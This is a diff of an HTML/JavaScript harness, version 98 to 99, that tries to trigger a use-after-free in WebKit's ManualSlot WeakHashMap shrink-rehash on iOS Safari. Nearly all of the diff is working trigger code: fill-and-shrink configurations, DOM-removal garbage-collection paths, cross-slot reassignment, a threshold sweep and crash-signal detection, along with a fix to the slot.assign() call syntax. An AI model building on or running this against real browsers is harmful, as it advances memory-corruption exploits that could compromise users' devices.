@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>ManualSlot UAF v98</title>
+<title>ManualSlot UAF v99</title>
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
 body { background:#0d0d0d; color:#00ff41; font-family:'Courier New',monospace; padding:16px; min-height:100vh; }
@@ -27,67 +27,28 @@ button.copy-done { border-color:#00ff41; color:#00ff41; animation: pulse 0.6s ea
 </head>
 <body>
 
-<h2>ManualSlot UAF v98 · rdar://179729192 · WeakHashMap shrink-rehash · iOS 26.5.2</h2>
+<h2>ManualSlot UAF v99 · rdar://179729192 · WeakHashMap shrink-rehash · iOS 26.5.2</h2>
 
 <div class="warn">
 ▶ OPEN DIRECTLY IN SAFARI on device.<br>
 <br>
+v99 FIX: slot.assign() is VARIADIC — must use spread syntax:<br>
+  WRONG (v98): slot.assign([n1,n2,n3])  ← TypeError, array is not a Node<br>
+  CORRECT (v99): slot.assign(n1,n2,n3)  or  slot.assign(...[n1,n2,n3])<br>
+<br>
+v99 adds API PROBE step — runs before all paths to verify the API is reachable.<br>
+<br>
 rdar://179729192: ManualSlot WeakHashMap UAF during shrink-rehash.<br>
-<br>
-CONTEXT:<br>
-  ShadowRoot in manual-slot mode maintains a WeakHashMap:<br>
-  m_manuallyAssignedSlotsForElementOrText : WeakHashMap&lt;Node, HTMLSlotElement&gt;<br>
-  Maps: assigned node → the slot it was assigned to<br>
-  Modified by: slot.assign(nodes) — each node added or removed updates this map<br>
-<br>
-BUG TRIGGER — SHRINK PATH:<br>
-  WTF::WeakHashMap (wraps WTF::HashTable) shrinks when:<br>
-    live keyCount &lt; tableSize / 8   (12.5% load threshold)<br>
-  Example: add 16 nodes → capacity=32, then remove 14 → live=2 → 2/32=6.25% → shrink<br>
-  During shrink: old bucket array freed, new smaller array allocated<br>
-  If any iterator/reference holds a ptr into old array during this → UAF<br>
-<br>
-TWO TRIGGER PATHS:<br>
-  PATH A — slot.assign([]) direct removal:<br>
-    1. slot.assign([n1,n2,...,n16]) → WeakHashMap grows to cap=32<br>
-    2. slot.assign([n1]) → removes n2..n16 → live=1 → 1/32=3% → shrink<br>
-    3. If WebKit is iterating the map during slot.assign() removal → UAF<br>
-<br>
-  PATH B — DOM removal (weak key GC):<br>
-    1. slot.assign([n1,...,n32]) → WeakHashMap grows to cap=64<br>
-    2. Remove n2..n28 from DOM → WeakPtrs become null → dead keys in map<br>
-    3. WeakHashMap::removeDeadKeysIfNeeded() → removes dead entries<br>
-    4. If live &lt; tableSize/8 after cleanup → shrink → rehash → UAF<br>
-<br>
-  PATH C — CROSS-ASSIGN (key path for UAF):<br>
-    The UAF in this bug likely occurs during resolveSlotsAfterSlotMutation<br>
-    on a MANUAL shadow root. When iterating m_manuallyAssignedSlotsForElementOrText<br>
-    and one iteration changes the map (reassignment) causing rehash.<br>
-    The iterator holds a ref into the old bucket → dangling after rehash.<br>
-    Trigger: two slots in same shadow root, slot A assigns node, slot B assigns<br>
-    same node (forced reassignment during resolution) → one assignment clears<br>
-    slot A's entry and adds to slot B → if map grows/shrinks → UAF.<br>
-<br>
-SIGNAL DETECTION:<br>
-  Unlike NamedSlot UAF, ManualSlot UAF might CRASH (null-deref) rather than<br>
-  silently write, if the iterator reads a zeroed freed chunk.<br>
-  Detection: try/catch around trigger. THREW = UAF crash = confirmed.<br>
-  Also: check assignedElements() before/after for unexpected state changes.<br>
-<br>
-KEY MATH for shrink threshold:<br>
-  tableSize=8: shrinks when live &lt; 1 (removing all entries from size-8 map)<br>
-  tableSize=16: shrinks when live &lt; 2<br>
-  tableSize=32: shrinks when live &lt; 4<br>
-  tableSize=64: shrinks when live &lt; 8<br>
-  tableSize=128: shrinks when live &lt; 16<br>
-  → Best target: grow to cap=64 (need 9+ nodes), remove all but 7 → 7/64=11% → shrink<br>
+WeakHashMap shrinks when live &lt; tableSize/8 (12.5% load threshold).<br>
+Example: fill 33 → cap=64, remove to keep=0 → 0/64=0% → shrink-rehash → UAF.
 </div>
 
 <div id="ctrl">
+  <button id="bProbe" onclick="runAPIProbe()" class="red">PROBE API</button>
   <button id="bA"   onclick="runPathA()" class="red">PATH-A: direct</button>
   <button id="bB"   onclick="runPathB()" class="red">PATH-B: DOM-GC</button>
   <button id="bC"   onclick="runPathC()" class="red">PATH-C: cross-assign</button>
-  <button id="bD"   onclick="runPathD()" class="red">PATH-D: grow+shrink sweep</button>
+  <button id="bD"   onclick="runPathD()" class="red">PATH-D: sweep</button>
   <button id="bL"   onclick="runLoop()"  class="red">LOOP ×200</button>
   <button id="bAll" onclick="runAll()"   class="purple">RUN ALL</button>
   <button id="bCopy" onclick="copyLog()">COPY LOG</button>
@@ -100,7 +61,7 @@ KEY MATH for shrink threshold:<br>
 'use strict';
 const RIG  = document.querySelector('#rig-area');
 const L    = document.getElementById('log');
-const BTNS = ['bA','bB','bC','bD','bL','bAll'];
+const BTNS = ['bProbe','bA','bB','bC','bD','bL','bAll'];
 let uafTotal = 0;
 let _inRunAll = false;
 
@@ -123,21 +84,134 @@ function dis(v){ BTNS.forEach(id=>{ const b=document.getElementById(id); if(b) b
 function noteUAF(tag){ uafTotal++; log(`  !!UAF-SIGNAL!! [${tag}] total=${uafTotal}`, 'hit'); }
 function delay(ms){ return new Promise(r=>setTimeout(r,ms)); }
 function tick(){ return new Promise(r=>setTimeout(r,0)); }
-function raf(){ return new Promise(r=>requestAnimationFrame(r)); }
+
+// ─────────────────────────────────────────────────────────────────────────────
+// API PROBE — run before everything to verify slot.assign is available & correct
+// ─────────────────────────────────────────────────────────────────────────────
+async function runAPIProbe(){
+  if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
+  log('╔══════════════════════════════════════════════════════════════╗','hi');
+  log('║  API PROBE · verify ManualSlot API availability              ║','hi');
+  log('╚══════════════════════════════════════════════════════════════╝','hi');
+  log('');
+
+  // 1. Does HTMLSlotElement exist?
+  const hasSlotEl = typeof HTMLSlotElement !== 'undefined';
+  log(`  HTMLSlotElement exists:          ${hasSlotEl}`, hasSlotEl?'ok':'bad');
+
+  // 2. Does HTMLSlotElement.prototype.assign exist?
+  const hasAssign = hasSlotEl && typeof HTMLSlotElement.prototype.assign === 'function';
+  log(`  HTMLSlotElement.prototype.assign: ${typeof (hasSlotEl ? HTMLSlotElement.prototype.assign : undefined)}`,
+      hasAssign?'ok':'bad');
+
+  // 3. Does attachShadow accept slotAssignment:'manual'?
+  let manualShadowOk = false;
+  let manualShadowSr = null;
+  {
+    const host = document.createElement('div');
+    try {
+      manualShadowSr = host.attachShadow({ mode:'open', slotAssignment:'manual' });
+      manualShadowOk = true;
+      log(`  attachShadow({slotAssignment:'manual'}): OK`, 'ok');
+    } catch(e){
+      log(`  attachShadow({slotAssignment:'manual'}): THREW: ${e.message}`, 'bad');
+    }
+  }
+
+  // 4. If shadow root was created, check its slotAssignment property
+  if(manualShadowSr){
+    const sa = manualShadowSr.slotAssignment;
+    log(`  shadowRoot.slotAssignment value: "${sa}"`, sa==='manual'?'ok':'bad');
+  }
+
+  // 5. Try calling slot.assign() with spread syntax (the CORRECT way)
+  if(hasAssign && manualShadowOk){
+    const host2 = document.createElement('div');
+    const sr2 = host2.attachShadow({mode:'open', slotAssignment:'manual'});
+    const slot2 = document.createElement('slot');
+    sr2.appendChild(slot2);
+    const child1 = document.createElement('span'); child1.textContent='t1';
+    const child2 = document.createElement('span'); child2.textContent='t2';
+    host2.appendChild(child1);
+    host2.appendChild(child2);
+    document.body.appendChild(host2);
+
+    // 5a. Spread call with array
+    let spreadOk = false;
+    try {
+      slot2.assign(...[child1, child2]);  // CORRECT: spread
+      spreadOk = true;
+      log(`  slot.assign(...[n1,n2]):         OK`, 'ok');
+    } catch(e){
+      log(`  slot.assign(...[n1,n2]):         THREW: ${e.message}`, 'bad');
+    }
+
+    // 5b. Direct variadic call
+    if(spreadOk){
+      try {
+        slot2.assign(child1);  // assign just one
+        log(`  slot.assign(n1):                OK`, 'ok');
+      } catch(e){
+        log(`  slot.assign(n1):                THREW: ${e.message}`, 'bad');
+      }
+
+      // 5c. Empty assign
+      try {
+        slot2.assign();  // assign none
+        log(`  slot.assign():                  OK`, 'ok');
+      } catch(e){
+        log(`  slot.assign():                  THREW: ${e.message}`, 'bad');
+      }
+
+      // 5d. Check assignedElements()
+      try {
+        slot2.assign(...[child1, child2]);
+        const ae = slot2.assignedElements();
+        log(`  slot.assignedElements() length: ${ae.length} (expected 2)`, ae.length===2?'ok':'bad');
+      } catch(e){
+        log(`  slot.assignedElements():        THREW: ${e.message}`, 'bad');
+      }
+    }
+
+    // 5e. The OLD wrong call (should throw)
+    try {
+      slot2.assign([child1, child2]);  // WRONG: passing array as first arg
+      log(`  slot.assign([n1,n2]) [WRONG WAY]: did NOT throw (unexpected!)`, 'inf');
+    } catch(e){
+      log(`  slot.assign([n1,n2]) [WRONG WAY]: threw as expected: ${e.message.substring(0,50)}`, 'dim');
+    }
+
+    document.body.removeChild(host2);
+  }
+
+  // 6. Summary
+  log('');
+  if(!hasAssign){
+    log('  !! HTMLSlotElement.assign NOT AVAILABLE on this device/Safari version', 'bad');
+    log('  !! rdar://179729192 cannot be triggered via JS — API is not exposed', 'bad');
+    log('  !! Possible: this Safari build predates assign() (added Safari 16.4)', 'bad');
+    log('  !! Or: iOS version has it disabled/hidden', 'bad');
+  } else if(!manualShadowOk){
+    log('  !! slotAssignment:manual NOT SUPPORTED on this device', 'bad');
+    log('  !! Cannot create manual shadow root', 'bad');
+  } else {
+    log('  API AVAILABLE — proceeding with UAF paths', 'ok');
+    log('  v99 fix confirmed: spread syntax works correctly', 'ok');
+  }
+  log('');
+  dis(false);
+}
 
 // ─────────────────────────────────────────────────────────────────────────────
 // MAKE MANUAL RIG
-// Returns a manual-slot shadow root with one slot and N assignable children
 // ─────────────────────────────────────────────────────────────────────────────
 function makeManualRig(pfx, numChildren){
   const host = document.createElement('div');
   host.style.cssText = 'display:block;width:80px;height:20px;';
-  // Manual slot assignment mode — KEY: slotAssignment:'manual'
   let sr;
   try {
     sr = host.attachShadow({ mode:'open', slotAssignment:'manual' });
   } catch(e){
-    // Safari might not support slotAssignment:'manual' or it might throw
     log(`  !! attachShadow({slotAssignment:'manual'}) THREW: ${e.message}`, 'bad');
     return null;
   }
@@ -155,57 +229,42 @@ function makeManualRig(pfx, numChildren){
   return { host, sr, slot, children, pfx };
 }
 
-// Helper: assign a set of children to the slot
-function assignNodes(slot, nodes){
-  try {
-    slot.assign(nodes);
-  } catch(e){
-    noteUAF(`assign-threw:${e.message.substring(0,40)}`);
-    return false;
-  }
-  return true;
-}
-
 // ─────────────────────────────────────────────────────────────────────────────
 // PATH A: Direct shrink via slot.assign() removal
-//
-// Theory: slot.assign([N nodes]) grows WeakHashMap to capacity C.
-//         slot.assign([few nodes]) removes most → live < C/8 → shrink → UAF.
-//
-// The UAF during shrink would occur IF WebKit holds a reference into the
-// WeakHashMap while slot.assign() is modifying it.
-// In practice: slot.assign() may iterate the current assignment list while
-// updating — if it does, the shrink during iteration causes dangling ref.
+// FIX v99: slot.assign(...nodes) — spread syntax
 // ─────────────────────────────────────────────────────────────────────────────
 async function probePathA(label, numFill, keepCount){
-  const rig = makeManualRig(label, numFill + 10); // extra children
+  const rig = makeManualRig(label, numFill + 2);
   if(!rig) return { sig:'NO-MANUAL-SLOT-SUPPORT', hit:false };
 
   const sigs = [];
   let threw = false, threwMsg = '';
 
-  // Step 1: fill WeakHashMap
-  if(!assignNodes(rig.slot, rig.children.slice(0, numFill))){
-    sigs.push('fill-assign-threw');
-    threw = true;
+  // Step 1: FILL WeakHashMap — CORRECT: spread syntax
+  try {
+    rig.slot.assign(...rig.children.slice(0, numFill));
+  } catch(e){
+    sigs.push('fill-threw');
+    threw = true; threwMsg = e.message;
+    noteUAF(`${label}-fill-threw:${e.message.substring(0,40)}`);
   }
   void rig.host.getBoundingClientRect();
 
-  // Check pre-assignment
   let preLen = -1;
   try { preLen = rig.slot.assignedElements().length; } catch(e){ preLen=-999; }
   sigs.push(`pre=${preLen}`);
 
   if(!threw){
-    // Step 2: shrink — assign only keepCount nodes
-    // This removes (numFill - keepCount) entries
-    // If numFill/tableSize > 1/8 before → live = keepCount
-    // If keepCount < tableSize/8 → shrink triggered
+    // Step 2: SHRINK — assign only keepCount nodes
     try {
-      rig.slot.assign(rig.children.slice(0, keepCount));
+      if(keepCount === 0){
+        rig.slot.assign();  // empty assign — no args
+      } else {
+        rig.slot.assign(...rig.children.slice(0, keepCount));
+      }
     } catch(e){
       threw = true; threwMsg = e.message;
-      noteUAF(`${label}-shrink-assign-threw:${e.message.substring(0,60)}`);
+      noteUAF(`${label}-shrink-threw:${e.message.substring(0,60)}`);
     }
     void rig.host.getBoundingClientRect();
   }
@@ -220,7 +279,7 @@ async function probePathA(label, numFill, keepCount){
       try { RIG.removeChild(rig.host); } catch(_){}
 
       const anyHit = threw || postLen === -999 ||
-                     (postLen !== keepCount && postLen !== -1);
+                     (!threw && postLen !== keepCount && postLen !== -1);
       if(anyHit && !threw) noteUAF(`${label}-stateCorrupt:post=${postLen}!=keep=${keepCount}`);
 
       const sig = `[${label}] fill=${numFill}→keep=${keepCount} | ${sigs.join(' | ')}`;
@@ -232,37 +291,30 @@ async function probePathA(label, numFill, keepCount){
 async function runPathA(){
   if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
   log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  PATH-A: direct shrink via slot.assign() removal             ║','hi');
+  log('║  PATH-A: direct shrink via slot.assign() removal   [v99 FIX] ║','hi');
   log('╚══════════════════════════════════════════════════════════════╝','hi');
   log('');
+  log('  Fill: slot.assign(...nodes)   Shrink: slot.assign(...fewer)','inf');
+  log('');
 
-  // tableSize thresholds:
-  // Grow to cap after filling N > cap/2 entries (HashMap grows when load > 50%)
-  // So to get cap=32 (shrink at <4 live): need to fill >16 → then keep <4
-  // To get cap=64 (shrink at <8 live): fill >32 → keep <8
   const configs = [
-    // fill=1 → cap=2 → shrink at live<1 → keep=0
-    { label:'A01', fill:1,  keep:0 },
-    // fill=5 → cap=8 → shrink at live<1 → keep=0
-    { label:'A05-k0', fill:5, keep:0 },
-    // fill=5 → cap=8 → shrink at live<1 → keep=1 (no shrink)
-    { label:'A05-k1', fill:5, keep:1 },
-    // fill=9 → cap=16 → shrink at live<2 → keep=1
-    { label:'A09-k1', fill:9, keep:1 },
-    // fill=9 → cap=16 → shrink at live<2 → keep=0
-    { label:'A09-k0', fill:9, keep:0 },
-    // fill=17 → cap=32 → shrink at live<4 → keep=3
-    { label:'A17-k3', fill:17, keep:3 },
-    // fill=17 → cap=32 → shrink at live<4 → keep=0
+    // cap thresholds: grows when fill > cap/2, shrinks when live < cap/8
+    // cap=8:   fill=5+,   shrink at live<1  → keep=0
+    { label:'A05-k0', fill:5,  keep:0 },
+    // cap=16:  fill=9+,   shrink at live<2  → keep=0,1
+    { label:'A09-k0', fill:9,  keep:0 },
+    { label:'A09-k1', fill:9,  keep:1 },
+    // cap=32:  fill=17+,  shrink at live<4  → keep=0..3
     { label:'A17-k0', fill:17, keep:0 },
-    // fill=33 → cap=64 → shrink at live<8 → keep=7
-    { label:'A33-k7', fill:33, keep:7 },
-    // fill=33 → cap=64 → shrink at live<8 → keep=0
+    { label:'A17-k3', fill:17, keep:3 },
+    // cap=64:  fill=33+,  shrink at live<8  → keep=0..7
     { label:'A33-k0', fill:33, keep:0 },
-    // fill=65 → cap=128 → shrink at live<16 → keep=15
-    { label:'A65-k15', fill:65, keep:15 },
-    // fill=65 → cap=128 → shrink at live<16 → keep=0
+    { label:'A33-k7', fill:33, keep:7 },
+    // cap=128: fill=65+,  shrink at live<16 → keep=0..15
     { label:'A65-k0', fill:65, keep:0 },
+    { label:'A65-k15',fill:65, keep:15},
+    // cap=256: fill=129+, shrink at live<32 → keep=0
+    { label:'A129-k0',fill:129,keep:0 },
   ];
 
   const sums = [];
@@ -274,43 +326,30 @@ async function runPathA(){
   }
 
   log('');
-  log('  Signals:', 'hi');
   const hits = sums.filter(r=>r.hit);
   if(hits.length){
-    for(const r of hits) log(`  !! ${r.sig}`, 'hit');
+    log(`  !! ${hits.length} UAF SIGNALS on PATH-A`, 'hit');
+    for(const r of hits) log(`    ${r.sig}`, 'hit');
   } else {
-    log('  0 signals — PATH A: no shrink-triggered UAF via direct removal', 'inf');
-    log('  Possible: shrink does not cause UAF in this code path (no concurrent iter)', 'dim');
+    log('  0 signals — PATH A: no shrink UAF on direct assign removal', 'inf');
   }
   dis(false);
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
-// PATH B: DOM removal → weak key GC → removeDeadKeysIfNeeded → shrink
-//
-// This is the GC-triggered path. When WeakPtr keys die (nodes removed from DOM),
-// the WeakHashMap accumulates dead entries. On the next access to the map,
-// removeDeadKeysIfNeeded() runs and:
-//   1. Removes dead entries (decrements live count)
-//   2. If live < tableSize/8 → shrink()
-//   3. shrink() allocates new smaller bucket array, copies live entries, frees old
-//   4. If anything is still iterating → dangling ref → UAF
-//
-// The "removeDeadKeysIfNeeded" is called at the START of most map operations.
-// So: fill map → remove nodes from DOM → access map → triggers cleanup → shrink.
-// During the cleanup-triggered shrink, are there concurrent iterators? YES:
-//   resolveSlotsAfterSlotMutation iterates m_manuallyAssignedSlotsForElementOrText
-//   while resolving slot assignments. If during iteration a dead-key cleanup
-//   triggers shrink, the iterator is invalidated.
+// PATH B: DOM removal → dead key GC → removeDeadKeysIfNeeded → shrink
+// FIX v99: assign calls use spread
 // ─────────────────────────────────────────────────────────────────────────────
 async function probePathB(label, numFill, numRemove, accessMethod){
   const rig = makeManualRig(label, numFill + 5);
   if(!rig) return { sig:'NO-MANUAL-SLOT-SUPPORT', hit:false };
 
-  // Fill the WeakHashMap with numFill entries
-  if(!assignNodes(rig.slot, rig.children.slice(0, numFill))){
+  // FILL — correct spread
+  try {
+    rig.slot.assign(...rig.children.slice(0, numFill));
+  } catch(e){
     try{ RIG.removeChild(rig.host); }catch(_){}
-    return { sig:`${label}-fill-threw`, hit:false };
+    return { sig:`${label}-fill-threw:${e.message.substring(0,40)}`, hit:false };
   }
   void rig.host.getBoundingClientRect();
 
@@ -319,47 +358,35 @@ async function probePathB(label, numFill, numRemove, accessMethod){
   try{ preLen = rig.slot.assignedElements().length; }catch(e){ preLen=-999; }
   sigs.push(`pre=${preLen}`);
 
-  // Remove numRemove children from DOM → their WeakPtrs become null
+  // Remove DOM nodes → WeakPtrs die
   const removed = [];
   for(let i=1; i<=numRemove && i<rig.children.length; i++){
     const n = rig.children[i];
     if(n.parentNode) n.parentNode.removeChild(n);
     removed.push(n);
   }
-  // Don't force layout yet — keep WeakPtrs as dead-but-not-cleaned
-
   sigs.push(`removed=${removed.length}`);
 
-  // GC opportunity: encourage WeakPtr cleanup
-  // On iOS/Safari, GC is incremental. Forcing layout may trigger some GC work.
   void rig.host.getBoundingClientRect();
-  await tick(); // yield to event loop — allow GC microtasks
+  await tick();
 
   let threw = false, threwMsg = '';
 
-  // ACCESS THE MAP to trigger removeDeadKeysIfNeeded → shrink
-  // Method 1: assignedElements() — reads current assignments, triggers cleanup
-  // Method 2: slot.assign([]) — clears map, triggers cleanup before clearing
-  // Method 3: add a new child's slot → triggers resolveSlotsAfterSlotMutation
-  //           which iterates the map while cleanup runs → potential UAF
   try {
     switch(accessMethod){
       case 'read':
-        // Just reading — triggers dead-key cleanup
         void rig.slot.assignedElements();
         break;
       case 'assign-new':
-        // Re-assign with a new child → may trigger shrink during internal iteration
+        // Reassign only the surviving child — CORRECT spread (single arg)
         if(rig.children[0].parentNode === rig.host){
-          rig.slot.assign([rig.children[0]]);
+          rig.slot.assign(rig.children[0]);  // single node, no spread needed
         }
         break;
       case 'assign-empty':
-        // Assign empty → triggers full removal → shrink
-        rig.slot.assign([]);
+        rig.slot.assign();  // empty — no args
         break;
       case 'force-resolution':
-        // Force slot assignment resolution by reading from DOM
         void rig.host.getBoundingClientRect();
         void rig.slot.assignedElements();
         break;
@@ -390,28 +417,22 @@ async function probePathB(label, numFill, numRemove, accessMethod){
 async function runPathB(){
   if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
   log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  PATH-B: DOM removal → dead key GC → shrink-rehash           ║','hi');
+  log('║  PATH-B: DOM removal → dead key GC → shrink      [v99 FIX]  ║','hi');
   log('╚══════════════════════════════════════════════════════════════╝','hi');
-  log('');
-  log('  Fill WeakHashMap → remove DOM nodes → WeakPtrs die → access → shrink','inf');
   log('');
 
   const configs = [
-    // fill=9, remove=8 → dead=8, live=1 → 1/16 < 1/8 → shrink if cleanup runs
     { label:'B09-r8-rd',   fill:9,  remove:8,  method:'read' },
     { label:'B09-r8-ae',   fill:9,  remove:8,  method:'assign-empty' },
     { label:'B09-r8-an',   fill:9,  remove:8,  method:'assign-new' },
-    // fill=17, remove=14 → dead=14, live=3 → 3/32 < 1/8 → shrink
     { label:'B17-r14-rd',  fill:17, remove:14, method:'read' },
     { label:'B17-r14-ae',  fill:17, remove:14, method:'assign-empty' },
     { label:'B17-r14-an',  fill:17, remove:14, method:'assign-new' },
     { label:'B17-r14-fr',  fill:17, remove:14, method:'force-resolution' },
-    // fill=33, remove=26 → dead=26, live=7 → 7/64 < 1/8 → shrink
     { label:'B33-r26-rd',  fill:33, remove:26, method:'read' },
     { label:'B33-r26-ae',  fill:33, remove:26, method:'assign-empty' },
     { label:'B33-r26-an',  fill:33, remove:26, method:'assign-new' },
     { label:'B33-r26-fr',  fill:33, remove:26, method:'force-resolution' },
-    // fill=65, remove=58 → dead=58, live=7 → 7/128 < 1/8 → shrink (biggest map)
     { label:'B65-r58-rd',  fill:65, remove:58, method:'read' },
     { label:'B65-r58-an',  fill:65, remove:58, method:'assign-new' },
     { label:'B65-r58-fr',  fill:65, remove:58, method:'force-resolution' },
@@ -437,22 +458,8 @@ async function runPathB(){
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
-// PATH C: Cross-assign forced reassignment
-//
-// If two slots in the SAME shadow root both try to assign the SAME child node:
-//   shadow root has slotA and slotB (manual mode)
-//   slotA.assign([child]) → WeakHashMap: child → slotA
-//   slotB.assign([child]) → WebKit must remove child from slotA, add to slotB
-//     → During this operation, is the WeakHashMap iterated while modified?
-//     → If yes, and if the modification causes rehash → UAF
-//
-// Also test: calling slot.assign() recursively via a slotchange handler
-//   → slotA.assign() fires slotchange event
-//   → In slotchange handler: call slotB.assign() which modifies same WeakHashMap
-//   → If slotA.assign() is mid-iteration when slotB.assign() runs → UAF
-//
-// Note: slotchange on manual slots fires synchronously or as microtask?
-//   Per spec: should be queued (microtask). But let's test.
+// PATH C: Cross-assign — two slots compete for same node
+// FIX v99: all assign() calls use spread syntax
 // ─────────────────────────────────────────────────────────────────────────────
 async function probePathC(label, numChildren, useMutationInHandler){
   const host = document.createElement('div');
@@ -478,34 +485,31 @@ async function probePathC(label, numChildren, useMutationInHandler){
   void host.getBoundingClientRect();
 
   let threw = false, threwMsg='';
-  let scA=0, scB=0;
+  let scA=0;
   const sigs = [];
 
   if(useMutationInHandler){
-    // Recursive: slotA.assign fires slotchange → in handler, call slotB.assign
-    // This happens DURING slot resolution processing
     slotA.addEventListener('slotchange', ()=>{
       scA++;
       if(scA === 1){
         try{
-          // This modifies the WeakHashMap while slotA's assignment is being processed
-          slotB.assign(children.slice(0, Math.floor(numChildren/2)));
+          // Modify WeakHashMap during slotA resolution — FIX: spread
+          slotB.assign(...children.slice(0, Math.floor(numChildren/2)));
         } catch(e){ threw=true; threwMsg=e.message; noteUAF(`${label}-sc-assign-threw`); }
       }
     });
   }
 
-  // Fill slotA with ALL children
+  // Fill slotA with ALL children — FIX: spread
   try {
-    slotA.assign(children);
+    slotA.assign(...children);
   } catch(e){ threw=true; threwMsg=e.message; noteUAF(`${label}-fillA-threw`); }
   void host.getBoundingClientRect();
 
   if(!threw){
-    // Now steal half of them for slotB → should trigger removal from slotA's assignment
-    // and modify the WeakHashMap while potentially iterating
+    // Steal half for slotB — FIX: spread
     try {
-      slotB.assign(children.slice(0, Math.floor(numChildren/2)));
+      slotB.assign(...children.slice(0, Math.floor(numChildren/2)));
     } catch(e){ threw=true; threwMsg=e.message; noteUAF(`${label}-fillB-threw`); }
     void host.getBoundingClientRect();
   }
@@ -529,12 +533,8 @@ async function probePathC(label, numChildren, useMutationInHandler){
 async function runPathC(){
   if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
   log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  PATH-C: cross-assign (same node → two slots)               ║','hi');
+  log('║  PATH-C: cross-assign (same node → two slots)   [v99 FIX]   ║','hi');
   log('╚══════════════════════════════════════════════════════════════╝','hi');
-  log('');
-  log('  Two manual slots in same shadow root. Assign same nodes to both.','inf');
-  log('  WebKit must update WeakHashMap entries for shared nodes.','inf');
-  log('  Also test: slotchange handler re-assigns during slot resolution.','inf');
   log('');
 
   const configs = [
@@ -542,6 +542,7 @@ async function runPathC(){
     {label:'C8-noh', n:8,  handler:false},
     {label:'C16-noh',n:16, handler:false},
     {label:'C32-noh',n:32, handler:false},
+    {label:'C64-noh',n:64, handler:false},
     {label:'C4-h',   n:4,  handler:true},
     {label:'C8-h',   n:8,  handler:true},
     {label:'C16-h',  n:16, handler:true},
@@ -560,7 +561,7 @@ async function runPathC(){
   const hits = sums.filter(r=>r.hit);
   if(hits.length){
     log(`  !! ${hits.length} hits on PATH-C`, 'hit');
-    for(const r of hits) log(`  ${r.sig}`, 'hit');
+    for(const r of hits) log(`    ${r.sig}`, 'hit');
   } else {
     log('  0 signals', 'inf');
   }
@@ -568,9 +569,8 @@ async function runPathC(){
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
-// PATH D: Systematic grow+shrink sweep
-// Find the EXACT threshold where the UAF fires.
-// Try ALL combinations of fill/remove within the dangerous zone.
+// PATH D: Systematic sweep — all fill/keep combos
+// FIX v99: spread syntax throughout
 // ─────────────────────────────────────────────────────────────────────────────
 async function probePathDSingle(fill, keep, method){
   const rig = makeManualRig(`d${fill}k${keep}`, fill + 2);
@@ -578,24 +578,27 @@ async function probePathDSingle(fill, keep, method){
 
   let threw=false, threwMsg='';
 
-  // Fill
-  try{ rig.slot.assign(rig.children.slice(0,fill)); }
-  catch(e){ threw=true; threwMsg=e.message; }
+  // FILL — FIX: spread
+  try {
+    if(fill > 0) rig.slot.assign(...rig.children.slice(0, fill));
+    else rig.slot.assign();
+  } catch(e){ threw=true; threwMsg=e.message; }
 
   if(!threw){
     void rig.host.getBoundingClientRect();
-    // Remove children to create dead entries (for GC path)
     if(method==='dom-remove'){
+      // Kill DOM nodes → weak keys die
       for(let i=keep; i<fill && i<rig.children.length; i++){
         if(rig.children[i].parentNode) rig.children[i].parentNode.removeChild(rig.children[i]);
       }
       await tick();
-      // Access to trigger cleanup
       try{ void rig.slot.assignedElements(); }catch(e){ threw=true; threwMsg=e.message; }
     } else {
-      // Direct: assign only keep nodes
-      try{ rig.slot.assign(rig.children.slice(0,keep)); }
-      catch(e){ threw=true; threwMsg=e.message; }
+      // Direct: assign only keep nodes — FIX: spread
+      try {
+        if(keep === 0) rig.slot.assign();
+        else rig.slot.assign(...rig.children.slice(0, keep));
+      } catch(e){ threw=true; threwMsg=e.message; }
     }
     void rig.host.getBoundingClientRect();
   }
@@ -607,8 +610,8 @@ async function probePathDSingle(fill, keep, method){
       catch(e){ post=-999; threw=true; noteUAF(`D${fill}k${keep}-post-threw`); }
       try{ RIG.removeChild(rig.host); }catch(_){}
       const hit = threw||post===-999;
-      if(hit) noteUAF(`D${fill}k${keep}m${method}-HIT`);
-      resolve({fill, keep, method, threw, post, hit});
+      if(hit && !threwMsg) noteUAF(`D${fill}k${keep}m${method}-stateCorrupt`);
+      resolve({fill, keep, method, threw, threwMsg:threwMsg.substring(0,40), post, hit});
     }, 50);
   });
 }
@@ -616,14 +619,10 @@ async function probePathDSingle(fill, keep, method){
 async function runPathD(){
   if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
   log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  PATH-D: grow+shrink sweep · all threshold combinations      ║','hi');
+  log('║  PATH-D: grow+shrink sweep · all combos          [v99 FIX]  ║','hi');
   log('╚══════════════════════════════════════════════════════════════╝','hi');
   log('');
 
-  // Sweet spot configs around each capacity threshold
-  // cap=16: fill=9..15, keep=0..1
-  // cap=32: fill=17..31, keep=0..3
-  // cap=64: fill=33..63, keep=0..7
   const batch = [];
   for(let fill=2; fill<=40; fill+=1){
     for(let keep=0; keep<=Math.min(fill-1, 8); keep++){
@@ -641,6 +640,7 @@ async function runPathD(){
     if(!r) continue;
     if(r.hit){ hit++; hits.push(r); }
     else ok++;
+    await delay(5);
   }
 
   log('');
@@ -648,27 +648,25 @@ async function runPathD(){
   if(hits.length){
     log(`  HIT CONFIGS:`, 'hit');
     for(const r of hits){
-      log(`    fill=${r.fill} keep=${r.keep} method=${r.method} threw=${r.threw} post=${r.post}`, 'hit');
+      log(`    fill=${r.fill} keep=${r.keep} method=${r.method} threw=${r.threw} threwMsg=${r.threwMsg} post=${r.post}`, 'hit');
     }
   } else {
     log('  0 signals across all threshold combinations', 'inf');
-    log('  ManualSlot WeakHashMap shrink does not trigger UAF via these paths', 'dim');
-    log('  Possible: rdar://179729192 requires a specific internal iteration path', 'dim');
-    log('  that is not triggered by slot.assign() or simple DOM removal.', 'dim');
+    log('  Either: (a) assign() variadic fix resolved the TypeError but no UAF fires,', 'dim');
+    log('    or (b) API probe will show assign() unavailable on this build.', 'dim');
   }
   dis(false);
 }
 
